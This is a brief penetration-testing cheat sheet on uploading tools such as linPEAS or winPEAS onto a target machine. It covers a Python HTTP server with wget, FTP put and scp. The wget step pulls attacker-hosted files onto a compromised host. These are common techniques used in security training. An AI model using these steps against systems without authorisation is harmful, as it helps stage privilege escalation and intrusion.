# Upload
Like the download process, is very common to upload file inside the target machine, such as linPEAS or winPEAS

## Python
The simplest way to do it is to start a Python Server in the same directory of the file and send a GET request

```console
# From Kali machine
python3 -m http.server {PORT}

# From Target machine
wget {TARGET_IP}:{PORT}/{FILE_NAME}
```

## FTP
File Transfer Protocol, standard protocol used to transfer files from one host to another

```console
ftp {TARGET_IP}

put {LOCAL PATH/FILE} {REMOTE PATH}
```

## SSH
Secure Copy Protocol, allows a secure file transfer using SSH.

```console
scp {FILE} {USERNAME}@{TARGET_IP}:{FILE_PATH_TO_WRITE}
```